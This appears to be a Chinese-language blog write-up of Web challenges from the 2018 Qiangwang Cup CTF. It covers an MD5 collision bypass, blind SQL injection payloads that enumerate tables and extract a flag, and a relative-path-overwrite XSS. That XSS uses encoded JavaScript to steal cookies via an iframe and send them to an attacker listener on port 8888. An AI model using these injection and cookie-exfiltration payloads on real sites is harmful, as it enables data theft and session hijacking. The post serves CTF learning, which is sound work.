---
layout: post
title: "2018强网杯Web部分writeup"
date: 2018-03-26 22：00
categories: jekyll update
---

# Web
## Web签到
&emsp;&emsp;这道题考的是`MD5`绕过，一共有三关，前面两个直接使用`数组`绕过即可，如下：
<div align="center">
    <img src="/images/posts/qwb/1.png" >  
</div>
&emsp;&emsp;第三个则需要找到两个真正相同的`MD5`的值，代码如下：
```php
if((string)$_POST['param1']!==(string)$_POST['param2'] && md5($_POST['param1'])===md5($_POST['param2'])){
            die("success!");
    }

```
&emsp;&emsp;`string`将数组转换成`'array'`所以无法使用数组进行绕过。

&emsp;&emsp;这里google了两个图片。
<div align="center">
    <img src="/images/posts/qwb/md5_1.jpg" >  
</div>
<div align="center">
    <img src="/images/posts/qwb/md5_2.jpg" >  
</div>
&emsp;&emsp;我们使用python将文件读取出来并进行`url编码`。
```python
>>> import urllib
>>> urllib.quote(open("md5_1.jpg", "rb").read())
```
&emsp;&emsp;然后提交即可。
<div align="center">
    <img src="/images/posts/qwb/2.png" >  
</div>
&emsp;&emsp;参考链接：

&emsp;&emsp;&emsp;&emsp;<a href="https://blog.csdn.net/caiqiiqi/article/details/68953730">Sha1碰撞</a><br>
&emsp;&emsp;&emsp;&emsp;<a href="https://www.yuzhenhai.com/view/201706/33755.html">md5相同的图片</a><br>

## three hit
&emsp;&emsp;这道题绕了好久，主要是思路被带偏了，实话就是自己太年轻。。。

&emsp;&emsp;首先注册的时候会发现后台对`username`跟`age`都有过滤，`age`只允许数字。
<div align="center">
    <img src="/images/posts/qwb/3.png" >  
</div>
&emsp;&emsp;然后我们尝试一下16进制是否可以。我们将要注入的字符进行16进制编码一下。
<div align="center">
    <img src="/images/posts/qwb/4.png" >  
</div>
<div align="center">
    <img src="/images/posts/qwb/5.png" >  
</div>
&emsp;&emsp;所以`POC`就已经出来了，而且还没有任何过滤，接着我们构造如下payload：
```
1 and ascii(substr((select flag from flag),1,1))>100
```
&emsp;&emsp;然后逐一判断即可得到flag。这里需要注意的是我们要使用`ascii`作为判断条件而不要使用`substr`防止得到`大小写`不准确的flag。

### --------------------------------后期复现分割线--------------------------------

## Python is the best language 1
&emsp;&emsp;`flask`代码审计，在`form.py`的表单里只有`PostForm`是没有过滤的，其他表单中都存在过滤函数。
<div align="center">
    <img src="/images/posts/qwb/6.png" >  
</div>
&emsp;&emsp;而这个表单在`/index`下被引用。
<div align="center">
    <img src="/images/posts/qwb/7.png" >  
</div>
&emsp;&emsp;再看看`Add()`函数。
<div align="center">
    <img src="/images/posts/qwb/8.png" >  
</div>
&emsp;&emsp;现在可以确定注入点就在这里。我们试一下：
```sql
'|conv(hex(substr(user(),1,4)),16, 10)|'
```
&emsp;&emsp;然后回显：
<div align="center">
    <img src="/images/posts/qwb/9.png" >  
</div>
&emsp;&emsp;说明确实存在注入，接着就是找表和字段，
```sql
'|conv(hex(substr((select table_name from information_schema.tables where table_schema=database()),1,4)),16,10)|'

'|conv(hex(substr((select column_name from information_schema.columns where table_name=0x666c616161616167 limit 0,1),1,4)),16,10)|'
```
&emsp;&emsp;结果就是表名：`flaaaaag`，列名：`flllllag`。payload：
```sql
'|conv(hex(substr((select flllllag from flaaaaag),1,4)),16,10)|'
```
&emsp;&emsp;最终flag：`QWB{us1ng_val1dator_caut1ous}`

## Share your mind
&emsp;&emsp;这道题考察的是`RPO(Relative Path Overwrite)相对路径覆盖`利用，如何判断的呢：

* **1、路由问题**
<div align="center">
    <img src="/images/posts/qwb/10.png" >  
</div>
<div align="center">
    <img src="/images/posts/qwb/11.png" >  
</div>
&emsp;&emsp;可以看到，这里加了`/aaaa`它还是能正确找到这份文件，所以如果我们在这个页面中写了一些`js`代码，并且以`js`去运行解析它的话就会造成任意`js`代码执行。

* **2、页面的js文件采用相对地址引入**

<div align="center">
    <img src="/images/posts/qwb/12.png" >  
</div>
&emsp;&emsp;注意前面的`../`。

* **3、浏览器和服务器对%2f的定义不同**

&emsp;&emsp;服务器在接收到`%2f`的时候会把它转化成`/`，当作目录解析。如：
```
http://39.107.33.96:20000/index.php/view/article/1111/aaa/..%2f..%2f../
转化成：
http://39.107.33.96:20000/index.php/view/article/1111/aaa/../../../
最终：
http://39.107.33.96:20000/index.php/view/
```
&emsp;&emsp;这里要注意的是浏览器在请求`js、css`文件时是以当前`url`的目录为基准的，然后在后面拼接`js、css`的地址，接着在请求该`js、css`。如：
```
http://39.107.33.96:20000/index.php/view/article/1111%27aaa
浏览器中的目录：
http://39.107.33.96:20000/index.php/view/article/
拼接js地址：
http://39.107.33.96:20000/index.php/view/article/../static/js/jquery.min.js
最终：
http://39.107.33.96:20000/index.php/view/static/js/jquery.min.js
```
&emsp;&emsp;这是因为`1111%27aaa`被当作了一个文件，而不是你想的`/1111/aaa`中`1111`是目录。

&emsp;&emsp;我们首先插个弹窗，然后查看下`raw`。
<div align="center">
    <img src="/images/posts/qwb/13.png" >  
</div>
<div align="center">
    <img src="/images/posts/qwb/14.png" >  
</div>
&emsp;&emsp;然后我们构造如下payload：
```
http://39.107.33.96:20000/index.php/view/article/1111/aaa/..%2f..%2f../
```
<div align="center">
    <img src="/images/posts/qwb/15.png" >  
</div>
&emsp;&emsp;可以看到已经弹窗，我们再看一下网络请求。
<div align="center">
    <img src="/images/posts/qwb/16.png" >  
</div>
<div align="center">
    <img src="/images/posts/qwb/17.png" >  
</div>
<div align="center">
    <img src="/images/posts/qwb/18.png" >  
</div>
&emsp;&emsp;可以发现它把我们`view raw`中的代码作为`js`解析了。

&emsp;&emsp;而经过测试，在`report`页面中是存在xss的。
<div align="center">
    <img src="/images/posts/qwb/19.png" height="60%" />  
</div>
&emsp;&emsp;但这道题的点不在这，我们回到`RPO`的利用中来，因为过滤了`<>`，所以我们用`eval(String.fromCharCode(xxx))`来绕过，所以payload：
```python
s="""var i=document.createElement("iframe");
i.src="/";
i.id="a";
document.body.appendChild(i);
i.onload = function (){
    var c=document.getElementById('a').contentWindow.document.cookie;
    location.href="http://ip:8888?xx="+c;
}"""

print "eval(String.fromCharCode(",
for i in s:
    print str(ord(i))+",",

print "))",
```
&emsp;&emsp;我们把它插入到`write article`里，然后获取到它的`url`，如：
<div align="center">
    <img src="/images/posts/qwb/20.png" />  
</div>
&emsp;&emsp;服务器端启动监听：`nc -tlp 8888`。

&emsp;&emsp;然后提交攻击链接：
```
http://39.107.33.96:20000/index.php/view/article/1198/aaaaa/..%2f..%2f../
```
&emsp;&emsp;接着就能在服务器上收到`hint`。
<div align="center">
    <img src="/images/posts/qwb/21.png" />  
</div>
&emsp;&emsp;这里提示`flag`在`/QWB_fl4g/QWB/`下的cookie中，所以我们将`iframe`的`src=/QWB_fl4g/QWB/`。代码如下：
```python
s="""var i=document.createElement("iframe");
i.src="/QWB_fl4g/QWB/";
i.id="a";
document.body.appendChild(i);
i.onload = function (){
    var c=document.getElementById('a').contentWindow.document.cookie;
    location.href="http://ip:8888?xx="+c;
}"""

print "eval(String.fromCharCode(",
for i in s:
    print str(ord(i))+",",

print "))",
```
&emsp;&emsp;跟上面同样的套路走起，最终获得flag：`QWB{flag_is_f43kth4rpo}`。
<div align="center">
    <img src="/images/posts/qwb/22.png" />  
</div>


&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;